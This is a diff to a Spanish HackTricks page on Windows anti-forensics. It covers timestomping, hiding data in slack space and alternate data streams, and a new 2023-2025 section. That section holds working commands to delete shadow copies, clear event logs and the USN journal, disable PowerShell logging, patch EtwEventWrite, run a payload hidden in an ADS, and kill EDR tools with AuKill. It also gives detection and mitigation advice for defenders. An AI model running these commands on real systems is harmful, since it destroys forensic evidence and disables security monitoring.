@@ -2,14 +2,14 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Timestamps
+## Tiempos
 
 Un atacante puede estar interesado en **cambiar las marcas de tiempo de los archivos** para evitar ser detectado.\
 Es posible encontrar las marcas de tiempo dentro del MFT en los atributos `$STANDARD_INFORMATION` \_\_ y \_\_ `$FILE_NAME`.
 
 Ambos atributos tienen 4 marcas de tiempo: **Modificación**, **acceso**, **creación** y **modificación del registro MFT** (MACE o MACB).
 
-**Windows explorer** y otras herramientas muestran la información de **`$STANDARD_INFORMATION`**.
+**El explorador de Windows** y otras herramientas muestran la información de **`$STANDARD_INFORMATION`**.
 
 ### TimeStomp - Herramienta anti-forense
 
@@ -42,11 +42,11 @@ Usando la misma herramienta es posible identificar **a qué hora se modificaron 
 
 ### Comparación de `$STANDARD_INFORMATION` y `$FILE_NAME`
 
-Otra forma de identificar archivos modificados sospechosos sería comparar el tiempo en ambos atributos buscando **incongruencias**.
+Otra forma de identificar archivos modificados sospechosos sería comparar el tiempo en ambos atributos buscando **inconsistencias**.
 
 ### Nanosegundos
 
-Las marcas de tiempo de **NTFS** tienen una **precisión** de **100 nanosegundos**. Por lo tanto, encontrar archivos con marcas de tiempo como 2010-10-10 10:10:**00.000:0000 es muy sospechoso**.
+Las marcas de tiempo de **NTFS** tienen una **precisión** de **100 nanosegundos**. Entonces, encontrar archivos con marcas de tiempo como 2010-10-10 10:10:**00.000:0000 es muy sospechoso**.
 
 ### SetMace - Herramienta anti-forense
 
@@ -54,13 +54,13 @@ Esta herramienta puede modificar ambos atributos `$STARNDAR_INFORMATION` y `$FIL
 
 ## Ocultamiento de Datos
 
-NFTS utiliza un clúster y el tamaño mínimo de información. Eso significa que si un archivo ocupa un clúster y medio, la **mitad restante nunca se utilizará** hasta que se elimine el archivo. Entonces, es posible **ocultar datos en este espacio de holgura**.
+NFTS utiliza un clúster y el tamaño mínimo de información. Eso significa que si un archivo ocupa y utiliza un clúster y medio, la **mitad restante nunca se va a utilizar** hasta que se elimine el archivo. Entonces, es posible **ocultar datos en este espacio de relleno**.
 
 Hay herramientas como slacker que permiten ocultar datos en este espacio "oculto". Sin embargo, un análisis del `$logfile` y `$usnjrnl` puede mostrar que se añadieron algunos datos:
 
 ![](<../../images/image (1060).png>)
 
-Entonces, es posible recuperar el espacio de holgura usando herramientas como FTK Imager. Tenga en cuenta que este tipo de herramienta puede guardar el contenido ofuscado o incluso cifrado.
+Entonces, es posible recuperar el espacio de relleno usando herramientas como FTK Imager. Tenga en cuenta que este tipo de herramienta puede guardar el contenido ofuscado o incluso cifrado.
 
 ## UsbKill
 
@@ -81,7 +81,7 @@ Es posible deshabilitar varios métodos de registro de Windows para dificultar m
 
 ### Deshabilitar Marcas de Tiempo - UserAssist
 
-Esta es una clave de registro que mantiene las fechas y horas en que cada ejecutable fue ejecutado por el usuario.
+Esta es una clave de registro que mantiene fechas y horas cuando cada ejecutable fue ejecutado por el usuario.
 
 Deshabilitar UserAssist requiere dos pasos:
 
@@ -117,7 +117,7 @@ Otro archivo que guarda información sobre los USB es el archivo `setupapi.dev.l
 ### Deshabilitar Copias de Sombra
 
 **Listar** copias de sombra con `vssadmin list shadowstorage`\
-**Eliminarlas** ejecutando `vssadmin delete shadow`
+**Eliminar** ejecutando `vssadmin delete shadow`
 
 También puede eliminarlas a través de la GUI siguiendo los pasos propuestos en [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
 
@@ -142,12 +142,78 @@ También es posible modificar la configuración de qué archivos se van a copiar
 
 ### Deshabilitar registros de eventos de Windows
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
-- Dentro de la sección de servicios, deshabilite el servicio "Registro de Eventos de Windows"
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- Dentro de la sección de servicios deshabilitar el servicio "Registro de Eventos de Windows"
 - `WEvtUtil.exec clear-log` o `WEvtUtil.exe cl`
 
 ### Deshabilitar $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## Registro Avanzado y Manipulación de Trazas (2023-2025)
+
+### Registro de ScriptBlock/Module de PowerShell
+
+Las versiones recientes de Windows 10/11 y Windows Server mantienen **ricos artefactos forenses de PowerShell** bajo
+`Microsoft-Windows-PowerShell/Operational` (eventos 4104/4105/4106).
+Los atacantes pueden deshabilitarlos o borrarlos sobre la marcha:
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+Remove-WinEvent               # requires admin & Win11 23H2+
+```
+Los defensores deben monitorear los cambios en esas claves del registro y la eliminación de eventos de PowerShell de alto volumen.
+
+### Parche ETW (Event Tracing for Windows)
+
+Los productos de seguridad de endpoints dependen en gran medida de ETW. Un método de evasión popular en 2024 es parchear `ntdll!EtwEventWrite`/`EtwEventWriteFull` en memoria para que cada llamada a ETW devuelva `STATUS_SUCCESS` sin emitir el evento:
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+patch, sizeof(patch), NULL);
+```
+Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive en PowerShell o C++.  
+Debido a que el parche es **local al proceso**, los EDR que se ejecutan dentro de otros procesos pueden pasarlo por alto.  
+Detección: comparar `ntdll` en memoria vs. en disco, o engancharse antes del modo usuario.
+
+### Revitalización de Flujos de Datos Alternativos (ADS)
+
+Se han observado campañas de malware en 2023 (e.g. **FIN12** loaders) que han estado utilizando binarios de segunda etapa dentro de ADS para mantenerse fuera de la vista de los escáneres tradicionales:
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+Enumerar flujos con `dir /R`, `Get-Item -Stream *`, o Sysinternals `streams64.exe`. Copiar el archivo de host a FAT/exFAT o a través de SMB eliminará el flujo oculto y puede ser utilizado por los investigadores para recuperar la carga útil.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver se utiliza ahora rutinariamente para **anti-forensics** en intrusiones de ransomware. La herramienta de código abierto **AuKill** carga un controlador firmado pero vulnerable (`procexp152.sys`) para suspender o terminar los sensores EDR y forenses **antes de la encriptación y destrucción de registros**:
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+El controlador se elimina después, dejando artefactos mínimos.  
+Mitigaciones: habilitar la lista de bloqueo de controladores vulnerables de Microsoft (HVCI/SAC) y alertar sobre la creación de servicios del kernel desde rutas escribibles por el usuario.
+
+---
+
+## Referencias
+
+- Sophos X-Ops – “AuKill: Un controlador vulnerable armado para deshabilitar EDR” (marzo de 2023)  
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr  
+- Red Canary – “Patching EtwEventWrite for Stealth: Detección y Caza” (junio de 2024)  
+https://redcanary.com/blog/etw-patching-detection  
 
 {{#include ../../banners/hacktricks-training.md}}
